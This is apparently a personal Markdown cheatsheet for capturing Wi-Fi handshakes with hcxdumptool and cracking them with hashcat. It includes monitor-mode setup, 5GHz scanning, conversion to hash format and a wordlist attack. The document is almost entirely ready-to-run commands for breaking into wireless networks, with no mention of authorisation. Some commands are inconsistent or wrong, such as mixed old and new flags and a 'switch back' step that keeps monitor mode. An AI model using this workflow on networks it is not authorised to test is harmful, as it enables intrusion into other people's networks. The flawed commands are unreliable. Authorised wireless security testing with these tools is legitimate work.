
```markdown
# Wi-Fi Handshake Capture & Crack Cheatsheet

## Table of Contents

## Table of Contents

- [Preliminary Commands & Information Retrieval](#preliminary-commands--information-retrieval)
- [Capture & Conversion Phase](#capture--conversion-phase)
- [Additional Scans & Information](#additional-scans--information)
- [Cracking Phase](#cracking-phase)
- [5GHz Network Capturing Cheat Sheet](#5ghz-network-capturing-cheat-sheet)


---

## Preliminary Commands & Information Retrieval

### Secure Copy from Remote Device

```bash
scp -r root@172.16.42.1:/root/example.pcapng /home/username/Desktop
```

📖 Downloads files from remote devices using SCP.

### Check Wireless Interfaces

```bash
iwconfig
```

📖 Displays wireless network interface details.

### Kill Interfering Services

```bash
airmon-ng check kill
```

📖 Stops services that might interfere with wireless tools.

---

## Capture & Conversion Phase

### Set Wireless Card to Monitor Mode

```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

# Set back to normal
ip link set wlan0mon down
iwconfig wlan0mon mode managed
ip link set wlan0 up
```

📖 Prepares the wireless card for capture.

### Capture Handshakes with hcxdumptool

```bash
hcxdumptool -i wlan1 -o dumpfile.pcapng --active_beacon --enable_status=15 //OLD
hcxdumptool -i wlan1 -w dumpfile.pcapng --disable_deauthentication --disable_beacon //NEW
hcxdumptool -i wlan1 -w dumpfile.pcapng --disable_deauthentication --rds=1//NEW
```

📖 Captures packets from networks.

### Convert Captured File for Hashcat

```bash
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

📖 Converts packets for password cracking.

---

## Additional Scans & Information

### Scan for Nearby Networks

```bash
hcxdumptool --do_rcascan -i wlan1
```

📖 Scans and displays nearby networks.

---

## Cracking Phase

### Crack with Hashcat

```bash
hashcat -m 22000 hash.hc22000 wordlist.txt
```

📖 Uses hashcat to attempt password cracks.

---

💡 `sudo systemctl stop NetworkManager.service`  
💡 `sudo systemctl stop wpa_supplicant.service`

---

# 5GHz Network Capturing Cheat Sheet

## 1. Install Necessary Tools

```bash
sudo apt-get install hcxdumptool hcxtools
```

## 2. Check for 5GHz Support

```bash
iw list
```

## 3. Enable Monitor Mode

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

## 4. Set to 5GHz Channel

```bash
sudo iw dev wlan0 set channel 36
```

## 5. Identify Target Networks

```bash
sudo hcxdumptool -i wlan0 --scan
```

## 6. Capture Traffic

```bash
sudo hcxdumptool -i wlan0 --enable_status=1 -o output.pcapng --filterlist=filterlist.txt --filtermode=2
```

## 7. Analyze Captured Traffic

```bash
hcxpcaptool -z output.hccapx output.pcapng
```

## 8. Troubleshooting

- Check regulatory domain:

```bash
sudo iw reg get
sudo iw reg set US
```

- Check for nearby networks:

```bash
sudo iw dev wlan0 scan | grep -E '^(BSS|channel)'
```

- Check adapter capabilities:

```bash
iw list
```

## 9. Switch Back to 2.4GHz

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo iw dev wlan0 set channel 6
sudo ip link set wlan0 up
```

## 10. List 2.4GHz Channels

```bash
iw phy phy0 channels
# or
iwlist wlan0 channel
```
```

Feel free to modify or add any additional information!
